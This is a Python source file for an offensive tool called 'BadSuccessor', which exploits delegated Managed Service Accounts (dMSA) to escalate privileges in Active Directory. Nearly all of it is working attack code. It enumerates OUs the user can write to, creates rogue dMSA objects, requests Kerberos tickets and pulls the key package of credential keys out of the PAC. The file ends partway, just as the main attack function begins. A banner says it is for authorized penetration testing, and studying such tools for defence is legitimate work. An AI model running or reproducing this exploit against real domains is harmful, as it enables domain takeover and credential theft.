#!/usr/bin/env python3
"""
BadSuccessor - Enhanced dMSA Privilege Escalation Tool (Linux Version)
Author: Based on research by Yuval Gordon (Akamai)
Description: Complete implementation of dMSA vulnerability exploitation for privilege escalation in Active Directory
Platform: Linux (non-domain joined)
Warning: For authorized penetration testing only
"""

import argparse
import sys
import subprocess
import json
import socket
import struct
import base64
import hashlib
import hmac
import time
from datetime import datetime, timedelta
import re
import os
import binascii
from binascii import hexlify, unhexlify
from urllib.parse import quote
import tempfile
import shutil
import uuid
import random
import string

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE, MODIFY_ADD, SASL, KERBEROS
    from ldap3.core.exceptions import LDAPException
    from ldap3.protocol.microsoft import security_descriptor_control
    from ldap3.utils.conv import escape_filter_chars
except ImportError:
    print("Error: ldap3 library required. Install with: pip3 install ldap3")
    sys.exit(1)

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    from impacket.krb5.crypto import Key, _enctype_table
    from impacket.ntlm import compute_lmhash, compute_nthash
    from impacket import version
    from impacket.dcerpc.v5 import transport, epm, samr, lsat, lsad
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import AP_REQ, AS_REQ, TGS_REQ, AS_REP, TGS_REP, EncTicketPart
    from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER
    from impacket.smbconnection import SMBConnection
    from impacket.ldap import ldaptypes
except ImportError as e:
    print(f"Error importing impacket: {e}")
    print("Trying alternative import method...")
    try:
        # Try alternative import paths
        import impacket
        from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError, getKerberosTGS
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime, Ticket
        from impacket.krb5.crypto import Key, _enctype_table
        from impacket.ntlm import compute_lmhash, compute_nthash
        from impacket.dcerpc.v5 import transport, epm, samr, lsat, lsad
        from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        from impacket.krb5.ccache import CCache
        from impacket.krb5.asn1 import AP_REQ, AS_REQ, TGS_REQ, AS_REP, TGS_REP, EncTicketPart
        from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER
        from impacket.smbconnection import SMBConnection
        from impacket.ldap import ldaptypes
    except ImportError:
        print("Error: impacket library required. Install with: pip3 install impacket")
        print("If already installed, try: python3 -m pip install --upgrade impacket")
        sys.exit(1)

try:
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type import univ, namedtype, namedval, tag, constraint, useful
    from pyasn1.codec.native import decoder as native_decoder
    import pyasn1
except ImportError:
    print("Error: pyasn1 library required. Install with: pip3 install pyasn1")
    sys.exit(1)

try:
    from Crypto.Cipher import ARC4, AES
    from Crypto.Hash import MD4, MD5, HMAC, SHA1
except ImportError:
    try:
        from Cryptodome.Cipher import ARC4, AES
        from Cryptodome.Hash import MD4, MD5, HMAC, SHA1
    except ImportError:
        print("Error: pycryptodome library required. Install with: pip3 install pycryptodome")
        sys.exit(1)

# ASN.1 structures for KERB-DMSA-KEY-PACKAGE
class EncryptionKey(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('keytype', univ.Integer().subtype(
            implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0))),
        namedtype.NamedType('keyvalue', univ.OctetString().subtype(
            implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 1)))
    )

class KeyList(univ.SequenceOf):
    componentType = EncryptionKey()

class KerbDmsaKeyPackage(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('current-keys', KeyList().subtype(
            implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0))),
        namedtype.OptionalNamedType('previous-keys', KeyList().subtype(
            implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 1)))
    )

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class ACLPermissionChecker:
    """Enhanced ACL permission checking for Active Directory objects"""

    # Access mask constants - from Windows SDK
    ADS_RIGHT_DS_CREATE_CHILD = 0x00000001
    ADS_RIGHT_DS_DELETE_CHILD = 0x00000002
    ADS_RIGHT_ACTRL_DS_LIST = 0x00000004
    ADS_RIGHT_DS_SELF = 0x00000008
    ADS_RIGHT_DS_READ_PROP = 0x00000010
    ADS_RIGHT_DS_WRITE_PROP = 0x00000020
    ADS_RIGHT_DS_DELETE_TREE = 0x00000040
    ADS_RIGHT_DS_LIST_OBJECT = 0x00000080
    ADS_RIGHT_DS_CONTROL_ACCESS = 0x00000100
    ADS_RIGHT_DELETE = 0x00010000
    ADS_RIGHT_READ_CONTROL = 0x00020000
    ADS_RIGHT_WRITE_DAC = 0x00040000
    ADS_RIGHT_WRITE_OWNER = 0x00080000
    ADS_RIGHT_SYNCHRONIZE = 0x00100000
    ADS_RIGHT_ACCESS_SYSTEM_SECURITY = 0x01000000
    ADS_RIGHT_MAXIMUM_ALLOWED = 0x02000000
    ADS_RIGHT_GENERIC_ALL = 0x10000000
    ADS_RIGHT_GENERIC_EXECUTE = 0x20000000
    ADS_RIGHT_GENERIC_WRITE = 0x40000000
    ADS_RIGHT_GENERIC_READ = 0x80000000

    # Well-known object GUIDs
    DMSA_SCHEMA_GUID = "7b8b558a-93a5-4af7-adca-c017e67f1057"
    GMSA_SCHEMA_GUID = "7b8b558a-93a5-4af7-adca-c017e67f1057"
    COMPUTER_SCHEMA_GUID = "bf967a86-0de6-11d0-a285-00aa003049e2"
    ALL_OBJECTS_GUID = "00000000-0000-0000-0000-000000000000"

    # Well-known SIDs
    AUTHENTICATED_USERS_SID = "S-1-5-11"
    EVERYONE_SID = "S-1-1-0"
    ANONYMOUS_SID = "S-1-5-7"
    DOMAIN_USERS_RID = 513
    USERS_RID = 545

    # Excluded SIDs (high privilege groups we don't need to check)
    EXCLUDED_SIDS_SUFFIXES = ["-512", "-519"]
    EXCLUDED_SIDS = ["S-1-5-32-544", "S-1-5-18"]

    def __init__(self, connection, user_sid, username):
        self.connection = connection
        self.user_sid = user_sid
        self.username = username
        self.domain_dn = self._get_domain_dn()
        self.domain_sid = self._get_domain_sid()
        self.user_groups = self._get_user_groups()

    def _get_domain_dn(self):
        """Get the domain DN from the connection"""
        try:
            return self.connection.server.info.other['defaultNamingContext'][0]
        except:
            domain_parts = self.connection.server.host.split('.')
            return ','.join([f'DC={part}' for part in domain_parts if part])

    def _get_domain_sid(self):
        """Get the domain SID"""
        try:
            parts = self.user_sid.split('-')
            if len(parts) > 3:
                return '-'.join(parts[:-1])
            return None
        except:
            return None

    def _get_user_groups(self):
        """Get all groups the current user is a member of, including default groups"""
        groups = [self.user_sid]

        groups.extend([
            self.AUTHENTICATED_USERS_SID,
            self.EVERYONE_SID,
            "S-1-5-2",
            "S-1-5-4",
            "S-1-5-15"
        ])

        if self.domain_sid:
            groups.append(f"{self.domain_sid}-{self.DOMAIN_USERS_RID}")
            groups.append(f"S-1-5-32-{self.USERS_RID}")

        try:
            search_filter = f"(&(objectClass=user)(sAMAccountName={escape_filter_chars(self.username)}))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['memberOf', 'primaryGroupID', 'objectSid', 'tokenGroups']
            )

            if self.connection.entries:
                user_entry = self.connection.entries[0]

                if hasattr(user_entry, 'memberOf') and user_entry.memberOf:
                    for group_dn in user_entry.memberOf:
                        self.connection.search(
                            search_base=str(group_dn),
                            search_filter='(objectClass=*)',
                            attributes=['objectSid']
                        )
                        if self.connection.entries:
                            group_sid = str(self.connection.entries[0].objectSid)
                            if group_sid not in groups:
                                groups.append(group_sid)

                if hasattr(user_entry, 'primaryGroupID') and user_entry.primaryGroupID:
                    primary_gid = int(str(user_entry.primaryGroupID))
                    if self.domain_sid:
                        primary_group_sid = f"{self.domain_sid}-{primary_gid}"
                        if primary_group_sid not in groups:
                            groups.append(primary_group_sid)

                if hasattr(user_entry, 'tokenGroups') and user_entry.tokenGroups:
                    for token_group_sid in user_entry.tokenGroups:
                        sid_str = str(token_group_sid)
                        if sid_str not in groups:
                            groups.append(sid_str)

        except Exception as e:
            pass

        return groups

    def _is_excluded_sid(self, sid):
        """Check if SID should be excluded from permission checks"""
        if sid in self.EXCLUDED_SIDS:
            return True
        if self.domain_sid:
            for suffix in self.EXCLUDED_SIDS_SUFFIXES:
                if sid.startswith(self.domain_sid) and sid.endswith(suffix):
                    return True
        return False

    def _parse_security_descriptor(self, sd_data):
        """Parse security descriptor and extract DACL"""
        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
            return sd
        except Exception as e:
            return None

    def _check_ace_permissions(self, ace, object_type_filter=None):
        """Check if ACE grants relevant permissions"""
        permissions = {
            'create_child': False,
            'create_dmsa': False,
            'write': False,
            'generic_all': False,
            'generic_write': False,
            'full_control': False,
            'write_dac': False,
            'write_owner': False
        }

        if ace['AceType'] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
            return permissions

        mask = int(ace['Ace']['Mask']['Mask'])

        if mask & self.ADS_RIGHT_DS_CREATE_CHILD:
            permissions['create_child'] = True

            if hasattr(ace['Ace'], 'ObjectType'):
                object_type = ldaptypes.bin_to_string(ace['Ace']['ObjectType']).lower()
                if object_type == self.DMSA_SCHEMA_GUID.lower() or object_type == self.ALL_OBJECTS_GUID:
                    permissions['create_dmsa'] = True
            else:
                permissions['create_dmsa'] = True

        if mask & self.ADS_RIGHT_DS_WRITE_PROP:
            permissions['write'] = True

        if mask & self.ADS_RIGHT_GENERIC_ALL:
            permissions['generic_all'] = True
            permissions['full_control'] = True
            permissions['create_child'] = True
            permissions['create_dmsa'] = True
            permissions['write'] = True

        if mask & self.ADS_RIGHT_GENERIC_WRITE:
            permissions['generic_write'] = True
            permissions['write'] = True
            permissions['create_child'] = True
            permissions['create_dmsa'] = True

        if mask & self.ADS_RIGHT_WRITE_DAC:
            permissions['write_dac'] = True

        if mask & self.ADS_RIGHT_WRITE_OWNER:
            permissions['write_owner'] = True

        return permissions

    def check_permissions_on_ou(self, ou_dn, check_write=True):
        """Check if user has any relevant permissions on the specified OU"""
        permissions = {
            'create_child': False,
            'create_dmsa': False,
            'write': False,
            'generic_all': False,
            'generic_write': False,
            'full_control': False,
            'write_dac': False,
            'write_owner': False,
            'effective_permissions': []
        }

        try:
            controls = security_descriptor_control(criticality=True, sdflags=0x07)
            self.connection.search(
                search_base=ou_dn,
                search_filter='(objectClass=*)',
                attributes=['nTSecurityDescriptor', 'distinguishedName'],
                controls=[controls]
            )

            if not self.connection.entries:
                return permissions

            entry = self.connection.entries[0]
            if not hasattr(entry, 'nTSecurityDescriptor') or not entry.nTSecurityDescriptor:
                return permissions

            sd_data = entry.nTSecurityDescriptor.raw_values[0]
            sd = self._parse_security_descriptor(sd_data)

            if not sd or 'Dacl' not in sd or not sd['Dacl']:
                return permissions

            for ace in sd['Dacl']['Data']:
                sid = ace['Ace']['Sid'].formatCanonical()

                if self._is_excluded_sid(sid):
                    continue

                if sid in self.user_groups:
                    ace_perms = self._check_ace_permissions(ace)

                    for perm, value in ace_perms.items():
                        if value and perm != 'effective_permissions':
                            permissions[perm] = True
                            if perm not in permissions['effective_permissions']:
                                permissions['effective_permissions'].append(perm)

            if hasattr(sd, 'OwnerSid'):
                owner_sid = str(sd['OwnerSid'])
                if owner_sid in self.user_groups and not self._is_excluded_sid(owner_sid):
                    permissions['write_dac'] = True
                    if 'write_dac' not in permissions['effective_permissions']:
                        permissions['effective_permissions'].append('write_dac')

        except Exception as e:
            return self._test_permissions_empirically(ou_dn, check_write)

        return permissions

    def _test_permissions_empirically(self, ou_dn, check_write=True):
        """Test permissions empirically when DACL parsing fails"""
        permissions = {
            'create_child': False,
            'create_dmsa': False,
            'write': False,
            'generic_all': False,
            'generic_write': False,
            'full_control': False,
            'write_dac': False,
            'write_owner': False,
            'effective_permissions': []
        }

        if self._test_create_permission(ou_dn):
            permissions['create_child'] = True
            permissions['create_dmsa'] = True
            permissions['effective_permissions'].append('create_child')

        if check_write and self._test_write_permission(ou_dn):
            permissions['write'] = True
            permissions['generic_write'] = True
            permissions['effective_permissions'].append('write')

        if permissions['create_child'] and permissions['write']:
            permissions['generic_all'] = True
            permissions['full_control'] = True
            permissions['effective_permissions'].append('generic_all')

        return permissions

    def _test_create_permission(self, ou_dn):
        """Test if we can create objects in the OU"""
        try:
            test_name = f"TestObject{uuid.uuid4().hex[:8]}"
            test_dn = f"CN={test_name},{ou_dn}"

            success = self.connection.add(
                test_dn,
                ['top', 'container'],
                {'description': 'Permission test object'}
            )

            if success:
                self.connection.delete(test_dn)
                return True

            return False

        except Exception as e:
            return False

    def _test_write_permission(self, ou_dn):
        """Test if we have write permissions on the OU"""
        try:
            self.connection.search(
                search_base=ou_dn,
                search_filter='(objectClass=*)',
                attributes=['description']
            )

            if not self.connection.entries:
                return False

            original_description = None
            entry = self.connection.entries[0]
            if hasattr(entry, 'description') and entry.description:
                original_description = str(entry.description)

            test_description = f"Permission test - {uuid.uuid4().hex[:8]}"
            success = self.connection.modify(
                ou_dn,
                {'description': [(MODIFY_REPLACE, [test_description])]}
            )

            if success:
                if original_description:
                    self.connection.modify(
                        ou_dn,
                        {'description': [(MODIFY_REPLACE, [original_description])]}
                    )
                else:
                    self.connection.modify(
                        ou_dn,
                        {'description': [(MODIFY_REPLACE, [])]}
                    )
                return True

            return False

        except Exception as e:
            return False

class KerberosAuthenticator:
    """Handle Kerberos authentication and ticket manipulation"""

    def __init__(self, domain, dc_ip):
        self.domain = domain.upper()
        self.dc_ip = dc_ip

    def get_dmsa_tgt_with_pac(self, dmsa_name, domain, dc_ip, extract_keys=False):
        """Get TGT for dMSA including PAC with predecessor's privileges"""
        try:
            userName = f"{dmsa_name}$"

            lmhash = unhexlify("00000000000000000000000000000000")
            nthash = unhexlify("00000000000000000000000000000000")

            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName,
                "",
                domain,
                lmhash,
                nthash,
                None,
                kdcHost=dc_ip,
                requestPAC=True
            )

            key_package = None
            if extract_keys and cipher:
                key_package = self._extract_key_package_from_tgt(tgt, cipher, sessionKey)

            return tgt, sessionKey, key_package

        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTHENTICATION_FAILED.value:
                return self._get_dmsa_tgt_with_s4u(dmsa_name, domain, dc_ip, extract_keys)
            else:
                raise Exception(f"Failed to get dMSA TGT: {e}")
        except Exception as e:
            raise Exception(f"Failed to get dMSA TGT: {e}")

    def _get_dmsa_tgt_with_s4u(self, dmsa_name, domain, dc_ip, extract_keys=False):
        """Alternative method using S4U2Self if regular authentication fails"""
        try:
            raise Exception("S4U2Self authentication not implemented for dMSA")
        except Exception as e:
            raise Exception(f"S4U2Self failed: {e}")

    def _extract_key_package_from_tgt(self, tgt, cipher, sessionKey):
        """Extract KERB-DMSA-KEY-PACKAGE from TGT"""
        try:
            from impacket.krb5 import crypto
            from impacket.krb5.asn1 import TGS_REP
            from impacket.krb5.pac import PACTYPE
            from impacket.krb5.crypto import Key
            from impacket.structure import Structure

            tgs = decoder.decode(tgt, asn1Spec=TGS_REP())[0]
            enc_tgt = tgs['ticket']['enc-part']['cipher']
            decrypted_tgt = cipher.decrypt(sessionKey, 2, enc_tgt)
            dec_ticket_part = decoder.decode(decrypted_tgt)[0]
            auth_data = dec_ticket_part[3]

            pac_data = None
            for ad in auth_data:
                if ad[0] == 128:
                    for sub_ad in decoder.decode(ad[1])[0]:
                        if sub_ad[0] == 128:
                            pac_data = sub_ad[1]
                            break

            if not pac_data:
                return None

            pac = PACTYPE(pac_data.asOctets())

            key_package_buffer = None
            for pac_buffer in pac['Buffers']:
                if pac_buffer['Type'] == 14:
                    key_package_buffer = pac_buffer
                    break

            if not key_package_buffer:
                for pac_buffer in pac['Buffers']:
                    if pac_buffer['Type'] == PAC_CREDENTIAL_INFO:
                        offset = pac_buffer['Offset']
                        size = pac_buffer['cbBufferSize']
                        cred_data = pac_data[offset:offset+size]
                        return self._parse_dmsa_key_package(cred_data)

            if key_package_buffer:
                offset = key_package_buffer['Offset']
                size = key_package_buffer['cbBufferSize']
                key_package_data = pac_data[offset:offset+size]
                return self._parse_dmsa_key_package(key_package_data)

            return self._extract_from_pac_credentials(pac, pac_data, sessionKey)

        except Exception as e:
            return self._extract_key_package_alternative(tgt, sessionKey)

    def _parse_dmsa_key_package(self, data):
        """Parse the KERB-DMSA-KEY-PACKAGE ASN.1 structure"""
        try:
            key_package, _ = decoder.decode(data, asn1Spec=KerbDmsaKeyPackage())

            result = {
                'current_keys': [],
                'previous_keys': []
            }

            if key_package.hasValue() and key_package.hasComponent(0):
                current_keys = key_package.getComponentByPosition(0)
                for key in current_keys:
                    key_type = int(key['keytype'])
                    key_value = bytes(key['keyvalue'])
                    result['current_keys'].append({
                        'type': key_type,
                        'type_name': self._get_enctype_name(key_type),
                        'value': binascii.hexlify(key_value).decode('utf-8')
                    })

            if key_package.hasValue() and key_package.hasComponent(1):
                previous_keys = key_package.getComponentByPosition(1)
                for key in previous_keys:
                    key_type = int(key['keytype'])
                    key_value = bytes(key['keyvalue'])
                    result['previous_keys'].append({
                        'type': key_type,
                        'type_name': self._get_enctype_name(key_type),
                        'value': binascii.hexlify(key_value).decode('utf-8')
                    })

            return result

        except Exception as e:
            return None

    def _extract_from_pac_credentials(self, pac, pac_data, sessionKey):
        """Extract key package from PAC credentials section"""
        try:
            from impacket.krb5 import crypto
            from impacket.krb5.crypto import Key

            for pac_buffer in pac['Buffers']:
                if pac_buffer['Type'] == 3:  # PAC_CREDENTIAL_INFO
                    offset = pac_buffer['Offset']
                    size = pac_buffer['cbBufferSize']
                    cred_info = pac_data[offset:offset+size]

                    # Skip the version and encryption type fields
                    if len(cred_info) > 8:
                        enc_cred_data = cred_info[8:]  # Skip header

                        for enctype in [18, 17, 23]:  # AES256, AES128, RC4
                            try:
                                cipher = crypto._enctype_table[enctype]
                                key = Key(enctype, sessionKey)
                                decrypted = cipher.decrypt(key, 16, enc_cred_data)

                                key_package = self._parse_dmsa_key_package(decrypted)
                                if key_package:
                                    return key_package
                            except:
                                continue

            return None

        except Exception as e:
            return None

    def _extract_key_package_alternative(self, tgt, sessionKey):
        """Alternative extraction method for KERB-DMSA-KEY-PACKAGE"""
        try:
            tgt_bytes = tgt if isinstance(tgt, bytes) else bytes(tgt)

            possible_positions = []
            for i in range(len(tgt_bytes) - 100):
                if tgt_bytes[i] == 0x30:
                    try:
                        potential_kp = tgt_bytes[i:]
                        kp, remainder = decoder.decode(potential_kp, asn1Spec=KerbDmsaKeyPackage())
                        if kp.hasValue():
                            result = self._parse_dmsa_key_package(tgt_bytes[i:i+len(potential_kp)-len(remainder)])
                            if result and (result['current_keys'] or result['previous_keys']):
                                return result
                    except:
                        continue

            return {
                'current_keys': [],
                'previous_keys': [],
                'extraction_note': 'Key package not found in TGT'
            }

        except Exception as e:
            return None

    def _get_enctype_name(self, enctype):
        """Get human-readable name for encryption type"""
        enctype_names = {
            1: 'DES-CBC-CRC',
            3: 'DES-CBC-MD5',
            17: 'AES128-CTS-HMAC-SHA1-96',
            18: 'AES256-CTS-HMAC-SHA1-96',
            23: 'RC4-HMAC',
            24: 'RC4-HMAC-EXP',
            -128: 'RC4-HMAC-OLD-EXP'
        }
        return enctype_names.get(enctype, f'Unknown ({enctype})')

    def extract_dmsa_key_package(self, tgt_data, session_key):
        """Extract and parse KERB-DMSA-KEY-PACKAGE from TGT - public interface"""
        try:
            from impacket.krb5 import crypto
            from impacket.krb5.asn1 import TGS_REP

            tgs = decoder.decode(tgt_data, asn1Spec=TGS_REP())[0]
            etype = int(tgs['ticket']['enc-part']['etype'])

            cipher = crypto._enctype_table[etype]

            key_package = self._extract_key_package_from_tgt(tgt_data, cipher, session_key)

            if key_package and 'extraction_note' not in key_package:
                return key_package
            else:
                return key_package

        except Exception as e:
            return {
                'current_keys': [],
                'previous_keys': [],
                'error': str(e)
            }

class BadSuccessor:
    def __init__(self):
        self.banner = f"""
{Colors.RED}{Colors.BOLD}
██████╗  █████╗ ██████╗ ███████╗██╗   ██╗ ██████╗ ██████╗███████╗███████╗███████╗ ██████╗ ██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗
██████╔╝███████║██║  ██║███████╗██║   ██║██║     ██║     █████╗  ███████╗███████╗██║   ██║██████╔╝
██╔══██╗██╔══██║██║  ██║╚════██║██║   ██║██║     ██║     ██╔══╝  ╚════██║╚════██║██║   ██║██╔══██╗
██████╔╝██║  ██║██████╔╝███████║╚██████╔╝╚██████╗╚██████╗███████╗███████║███████║╚██████╔╝██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
{Colors.END}
{Colors.CYAN}Enhanced dMSA Privilege Escalation Tool - Full Implementation{Colors.END}
{Colors.YELLOW}Warning: For authorized penetration testing only!{Colors.END}
"""
        self.dc_ip = None
        self.domain = None
        self.username = None
        self.password = None
        self.connection = None
        self.domain_dn = None
        self.user_sid = None
        self.acl_checker = None
        self.kerberos_auth = None

    def print_banner(self):
        print(self.banner)

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": Colors.BLUE,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "CRITICAL": Colors.PURPLE
        }
        color = colors.get(level, Colors.WHITE)
        print(f"[{timestamp}] {color}[{level}]{Colors.END} {message}")

    def discover_domain_controller(self, domain):
        """Discover domain controller via DNS SRV record"""
        try:
            import dns.resolver
            srv_record = f"_ldap._tcp.{domain}"
            answers = dns.resolver.resolve(srv_record, 'SRV')
            for answer in answers:
                dc_hostname = str(answer.target).rstrip('.')
                try:
                    dc_ip = socket.gethostbyname(dc_hostname)
                    self.log(f"Found DC: {dc_hostname} ({dc_ip})", "SUCCESS")
                    return dc_ip, dc_hostname
                except socket.gaierror:
                    continue
        except ImportError:
            self.log("DNS resolution requires dnspython: pip3 install dnspython", "WARNING")
        except Exception as e:
            self.log(f"DNS discovery failed: {e}", "WARNING")

        return None, None

    def get_current_user_sid(self):
        """Get the SID of the currently authenticated user"""
        try:
            search_filter = f"(&(objectClass=user)(sAMAccountName={escape_filter_chars(self.username)}))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['objectSid']
            )

            if self.connection.entries:
                self.user_sid = str(self.connection.entries[0].objectSid)
                self.log(f"Current user SID: {self.user_sid}", "INFO")
                return self.user_sid
            return None
        except Exception as e:
            self.log(f"Failed to get user SID: {e}", "ERROR")
            return None

    def check_windows_2025_schema(self):
        """Verify Windows Server 2025 schema with dMSA support"""
        self.log("Checking for Windows Server 2025 schema support...")

        try:
            schema_dn = f"CN=Schema,CN=Configuration,{self.domain_dn}"

            dmsa_elements = {
                'msDS-DelegatedManagedServiceAccount': 'class',
                'msDS-ManagedAccountPrecededByLink': 'attribute',
                'msDS-DelegatedMSAState': 'attribute',
                'msDS-SupersededManagedAccountLink': 'attribute',
                'msDS-SupersededServiceAccountState': 'attribute'
            }

            found_elements = {}
            missing_elements = []

            for element_name, element_type in dmsa_elements.items():
                search_filter = f"(|(cn={element_name})(lDAPDisplayName={element_name}))"
                self.connection.search(
                    search_base=schema_dn,
                    search_filter=search_filter,
                    attributes=['cn', 'lDAPDisplayName', 'objectClass']
                )

                if self.connection.entries:
                    found_elements[element_name] = True
                    self.log(f"  ✓ {element_name} ({element_type})", "SUCCESS")
                else:
                    missing_elements.append(element_name)
                    self.log(f"  ✗ {element_name} ({element_type})", "WARNING")

            if not missing_elements:
                self.log("Full Windows Server 2025 dMSA schema detected!", "SUCCESS")
                return True
            else:
                self.log(f"Missing schema elements: {', '.join(missing_elements)}", "ERROR")
                self.log("Windows Server 2025 with dMSA support is required for this attack", "ERROR")
                return False

        except Exception as e:
            self.log(f"Error checking schema: {e}", "ERROR")
            return False

    def establish_ldap_connection(self, dc_ip, domain, username, password, use_ssl=False, port=None):
        """Establish authenticated LDAP connection"""
        try:
            if port is None:
                port = 636 if use_ssl else 389

            protocol = "LDAPS" if use_ssl else "LDAP"
            self.log(f"Attempting {protocol} connection to {dc_ip}:{port}", "INFO")

            if use_ssl:
                import ssl
                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
                server = Server(dc_ip, port=port, use_ssl=True, tls=tls, get_info=ALL)
            else:
                server = Server(dc_ip, port=port, get_info=ALL)

            user_dn = f"{domain}\\{username}"
            conn = Connection(server, user=user_dn, password=password, authentication=NTLM, auto_bind=True)

            if conn.bind():
                self.log(f"{protocol} authentication successful", "SUCCESS")

                try:
                    self.domain_dn = conn.server.info.other['defaultNamingContext'][0]
                except:
                    domain_parts = domain.split('.')
                    self.domain_dn = ','.join([f'DC={part}' for part in domain_parts])

                self.log(f"Domain DN: {self.domain_dn}", "INFO")

                return conn
            else:
                self.log(f"{protocol} authentication failed", "ERROR")
                return None

        except Exception as e:
            self.log(f"{protocol} connection error: {e}", "ERROR")
            return None

    def enumerate_writable_ous(self):
        """Enumerate OUs where current user can create dMSA objects or has write permissions"""
        self.log("Enumerating OUs with various write permissions...")
        self.log("Checking for: CreateChild, Write, GenericWrite, GenericAll permissions...")

        writable_ous = []

        try:
            search_filter = "(|(objectClass=organizationalUnit)(objectClass=container))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['distinguishedName', 'name', 'objectClass']
            )

            total_ous = len(self.connection.entries)
            self.log(f"Found {total_ous} OUs/containers to check", "INFO")

            for entry in self.connection.entries:
                ou_dn = str(entry.distinguishedName)
                ou_name = str(entry.name) if hasattr(entry, 'name') else ou_dn.split(',')[0].split('=')[1]

                permissions = self.acl_checker.check_permissions_on_ou(ou_dn)

                if any(permissions.values()) and permissions['effective_permissions']:
                    writable_ous.append({
                        'dn': ou_dn,
                        'name': ou_name,
                        'permissions': permissions['effective_permissions'],
                        'can_create_dmsa': permissions['create_child'] or permissions['create_dmsa'],
                        'details': permissions
                    })

                    perm_str = ', '.join([p.replace('_', ' ').title() for p in permissions['effective_permissions']])
                    self.log(f"  ✓ {ou_name}: {perm_str}", "SUCCESS")

            msa_dn = f"CN=Managed Service Accounts,{self.domain_dn}"
            try:
                permissions = self.acl_checker.check_permissions_on_ou(msa_dn)
                if any(permissions.values()) and permissions['effective_permissions']:
                    writable_ous.append({
                        'dn': msa_dn,
                        'name': 'Managed Service Accounts',
                        'permissions': permissions['effective_permissions'],
                        'can_create_dmsa': True,
                        'details': permissions
                    })
                    perm_str = ', '.join([p.replace('_', ' ').title() for p in permissions['effective_permissions']])
                    self.log(f"  ✓ Managed Service Accounts container: {perm_str}", "SUCCESS")
            except:
                pass

            self.log(f"\nTotal writable locations found: {len(writable_ous)}", "INFO")
            if writable_ous:
                self.log("Note: Permissions include those granted through group memberships", "INFO")
                self.log("Including default groups like Authenticated Users, Domain Users, etc.", "INFO")

            return writable_ous

        except Exception as e:
            self.log(f"Error enumerating OUs: {e}", "ERROR")
            return []

    def create_dmsa_object(self, ou_dn, dmsa_name):
        """Create a dMSA object with full Windows Server 2025 support"""
        self.log(f"Creating dMSA object: {dmsa_name} in {ou_dn}")

        try:
            dmsa_dn = f"CN={dmsa_name},{ou_dn}"

            attributes = {
                'objectClass': ['top', 'person', 'organizationalPerson', 'user', 'computer',
                               'msDS-GroupManagedServiceAccount', 'msDS-DelegatedManagedServiceAccount'],
                'cn': dmsa_name,
                'sAMAccountName': f"{dmsa_name}$",
                'userAccountControl': '4096',
                'msDS-DelegatedMSAState': '3',
                'dNSHostName': f"{dmsa_name.lower()}.{self.domain.lower()}",
                'servicePrincipalName': [
                    f"HOST/{dmsa_name.lower()}.{self.domain.lower()}",
                    f"HOST/{dmsa_name}",
                    f"RestrictedKrbHost/{dmsa_name.lower()}.{self.domain.lower()}",
                    f"RestrictedKrbHost/{dmsa_name}"
                ],
                'msDS-SupportedEncryptionTypes': '28',
            }

            success = self.connection.add(dmsa_dn, attributes=attributes)

            if success:
                self.log(f"Successfully created dMSA: {dmsa_dn}", "SUCCESS")

                self.connection.search(
                    search_base=dmsa_dn,
                    search_filter='(objectClass=*)',
                    attributes=['*']
                )

                if self.connection.entries:
                    self.log("dMSA object verified in directory", "SUCCESS")

                return dmsa_dn
            else:
                error = self.connection.result
                self.log(f"Failed to create dMSA: {error}", "ERROR")

                if "objectClass" in str(error):
                    self.log("Trying alternative object class combination...", "INFO")
                    attributes['objectClass'] = ['top', 'person', 'organizationalPerson', 'user', 'computer']

                    success = self.connection.add(dmsa_dn, attributes=attributes)
                    if success:
                        self.connection.modify(dmsa_dn, {
                            'objectClass': [(MODIFY_ADD, ['msDS-GroupManagedServiceAccount', 'msDS-DelegatedManagedServiceAccount'])]
                        })
                        self.log(f"Successfully created dMSA with fallback method", "SUCCESS")
                        return dmsa_dn

                return None

        except Exception as e:
            self.log(f"Error creating dMSA: {e}", "ERROR")
            return None

    def perform_badsuccessor_attack(self, dmsa_dn, target_user):
